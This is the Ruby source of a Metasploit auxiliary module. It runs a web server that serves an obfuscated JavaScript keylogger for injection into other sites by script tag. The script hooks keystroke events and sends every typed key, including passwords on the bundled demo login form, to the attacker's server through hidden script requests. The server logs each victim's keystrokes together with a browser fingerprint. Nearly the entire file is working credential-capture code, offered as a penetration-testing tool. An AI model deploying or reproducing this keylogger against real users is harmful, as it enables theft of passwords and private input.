##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'			=> 'Capture: HTTP JavaScript Keylogger',
      'Description'	=> %q{
          This modules runs a web server that demonstrates keystroke
        logging through JavaScript. The DEMO option can be set to enable
        a page that demonstrates this technique. Future improvements will
        allow for a configurable template to be used with this module.
        To use this module with an existing web page, simply add a
        script source tag pointing to the URL of this service ending
        in the .js extension. For example, if URIPATH is set to "test",
        the following URL will load this script into the calling site:
        http://server:port/test/anything.js
      },
      'License'	=> MSF_LICENSE,
      'Author'	=> ['Marcus J. Carey <mjc[at]threatagent.com>', 'hdm']
  ))

  register_options(
    [
      OptBool.new('DEMO', [true, "Creates HTML for demo purposes", false]),
    ], self.class)
  end


  # This is the module's main runtime method
  def run
    @seed = Rex::Text.rand_text_alpha(12)
    @client_cache = {}

    # Starts Web Server
    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
    exploit
  end

  # This handles the HTTP responses for the Web server
  def on_request_uri(cli, request)

    cid = nil

    if request['Cookie'].to_s =~ /,?\s*id=([a-f0-9]{4,32})/i
      cid = $1
    end

    if not cid and request.qstring['id'].to_s =~ /^([a-f0-9]{4,32})/i
      cid = $1
    end

    data = request.qstring['data']

    unless cid
      cid = generate_client_id(cli,request)
      print_status("Assigning client identifier '#{cid}'")

      resp = create_response(302, 'Moved')
      resp['Content-Type'] = 'text/html'
      resp['Location']     = request.uri + '?id=' + cid
      resp['Set-Cookie']   = "id=#{cid}"
      cli.send_response(resp)
      return
    end

    base_url = generate_base_url(cli, request)

    # print_status("#{cli.peerhost} [#{cid}] Incoming #{request.method} request for #{request.uri}")

    case request.uri
    when /\.js(\?|$)/
      content_type = "text/plain"
      send_response(cli, generate_keylogger_js(base_url, cid), {'Content-Type'=> content_type, 'Set-Cookie' => "id=#{cid}"})

    when /\/demo\/?(\?|$)/
      if datastore['DEMO']
        content_type = "text/html"
        send_response(cli, generate_demo(base_url, cid), {'Content-Type'=> content_type, 'Set-Cookie' => "id=#{cid}"})
      else
        send_not_found(cli)
      end

    else
      if data
        nice = process_data(cli, request, cid, data)
        script = datastore['DEMO'] ? generate_demo_js_reply(base_url, cid, nice) : ""
        send_response(cli, script, {'Content-Type' => "text/plain", 'Set-Cookie' => "id=#{cid}"})
      else
        if datastore['DEMO']
          send_redirect(cli, "/demo/?cid=#{cid}")
        else
          send_not_found(cli)
        end
      end
    end
  end

  # Figure out what our base URL is based on the user submitted
  # Host header or the address of the client.
  def generate_base_url(cli, req)
    port = nil
    host = Rex::Socket.source_address(cli.peerhost)

    if req['Host']
      host = req['Host']
      bits = host.split(':')

      # Extract the hostname:port sequence from the Host header
      if bits.length > 1 and bits.last.to_i > 0
        port = bits.pop.to_i
        host = bits.join(':')
      end
    else
      port = datastore['SRVPORT'].to_i
    end

    prot = (!! datastore['SSL']) ? 'https://' : 'http://'
    if Rex::Socket.is_ipv6?(host)
      host = "[#{host}]"
    end

    base = prot + host
    if not ((prot == 'https' and port.nil?) or (prot == 'http' and port.nil?))
      base << ":#{port}"
    end

    base << get_resource
  end

  def process_data(cli, request, cid, data)

    lines = [""]
    real  = ""

    Rex::Text.uri_decode(data).split(",").each do |char|
      byte = char.to_s.hex.chr
      next if byte == "\x00"
      real << byte
      case char.to_i
      # Do Backspace
      when 8
        lines[-1] = lines[-1][0, lines[-1].length - 1] if lines[-1].length > 0
      when 13
        lines << ""
      else
        lines[-1] << byte
      end
    end

    nice = lines.join("<CR>").gsub("\t", "<TAB>")
    real = real.gsub("\x08", "<DEL>")

    if not @client_cache[cid]

      fp = fingerprint_user_agent(request['User-Agent'] || "")
      header  = "Browser Keystroke Log\n"
      header << "=====================\n"
      header << "Created: #{Time.now.to_s}\n"
      header << "Address: #{cli.peerhost}\n"
      header << "     ID: #{cid}\n"
      header << " FPrint: #{fp.inspect}\n"
      header << "    URL: #{request.uri}\n"
      header << "\n"
      header << "====================\n\n"

      @client_cache[cid] = {
        :created => Time.now.to_i,
        :path_clean => store_loot("browser.keystrokes.clean", "text/plain", cli.peerhost, header, "keystrokes_clean_#{cid}.txt", "Browser Keystroke Logs (Clean)"),
        :path_raw   => store_loot("browser.keystrokes.raw", "text/plain", cli.peerhost, header, "keystrokes_clean_#{cid}.txt", "Browser Keystroke Logs (Raw)")
      }
      print_good("[#{cid}] Logging clean keystrokes to: #{@client_cache[cid][:path_clean]}")
      print_good("[#{cid}] Logging raw keystrokes to: #{@client_cache[cid][:path_raw]}")
    end

    ::File.open( @client_cache[cid][:path_clean], "ab") { |fd| fd.puts nice }
    ::File.open( @client_cache[cid][:path_raw], "ab")   { |fd| fd.write(real) }

    if nice.length > 0
      print_good("[#{cid}] Keys: #{nice}")
    end

    nice
  end

  def generate_client_id(cli, req)
    "%.8x" % Kernel.rand(0x100000000)
  end


  def generate_demo(base_url, cid)
    # This is the Demo Form Page <HTML>
    html = <<EOS
<html>
<head>
<title>Demo Form</title>
<script type="text/javascript" src="#{base_url}/#{@seed}.js?id=#{cid}"></script>
</head>
<body bgcolor="white">
<br><br>
<div align="center">
<h1>Keylogger Demo Form</h1>
<form method=\"POST\" name=\"logonf\" action=\"#{base_url}/demo/?id=#{cid}\">
<p><font color="red"><i>This form submits data to the Metasploit listener for demonstration purposes.</i></font>
<br><br>
<table border="0" cellspacing="0" cellpadding="0">
<tr><td>Username:</td> <td><input name="username" size="20"></td> </tr>
<tr><td>Password:</td> <td><input type="password" name="password" size="20"></td> </tr>
</table>
<p align="center"><input type="submit" value="Submit"></p></form>

<br/>
<textarea cols="80" rows="5" id="results">
</textarea>

</div>
</body>
</html>
EOS
    return html
  end

  # This is the JavaScript Key Logger Code
  def generate_keylogger_js(base_url, cid)

    targ = Rex::Text.rand_text_alpha(12)

    code = <<EOS

var c#{@seed} = 0;
window.onload = function load#{@seed}(){
  l#{@seed} = ",";

  if (window.addEventListener) {
    document.addEventListener('keypress', p#{@seed}, true);
    document.addEventListener('keydown', d#{@seed}, true);
  } else if (window.attachEvent) {
    document.attachEvent('onkeypress', p#{@seed});
    document.attachEvent('onkeydown', d#{@seed});
  } else {
    document.onkeypress = p#{@seed};
    document.onkeydown = d#{@seed};
  }

}
function p#{@seed}(e){
  k#{@seed} = (window.event) ? window.event.keyCode : e.which;
  k#{@seed} = k#{@seed}.toString(16);
  if (k#{@seed} != "d"){
    #{@seed}(k#{@seed});
  }
}
function d#{@seed}(e){
  k#{@seed} = (window.event) ? window.event.keyCode : e.which;
  if (k#{@seed} == 9 || k#{@seed} == 8 || k#{@seed} == 13){
    #{@seed}(k#{@seed});
  }
}

function #{@seed}(k#{@seed}){
  l#{@seed} = l#{@seed} + k#{@seed} + ",";

  var t#{@seed} = "#{targ}" + c#{@seed};
  c#{@seed}++;

  var f#{@seed};

  if (document.all)
    f#{@seed} = document.createElement("<script name='" + t#{@seed} + "' id='" + t#{@seed} + "'></script>");
  else {
    f#{@seed} = document.createElement("script");
    f#{@seed}.setAttribute("id", t#{@seed});
    f#{@seed}.setAttribute("name", t#{@seed});
  }

  f#{@seed}.setAttribute("src", "#{base_url}?id=#{cid}&data=" + l#{@seed});
  f#{@seed}.style.visibility = "hidden";

  document.body.appendChild(f#{@seed});

  if (k#{@seed} == 13 || l#{@seed}.length > 3000)
    l#{@seed} = ",";

  setTimeout('document.body.removeChild(document.getElementById("' + t#{@seed} + '"))', 5000);
}
EOS
    return code
  end

  def generate_demo_js_reply(base_url, cid, data)
    code = <<EOS
      try {
        document.getElementById("results").value = "Keystrokes: #{data}";
      } catch(e) { }
EOS
    return code
  end

end
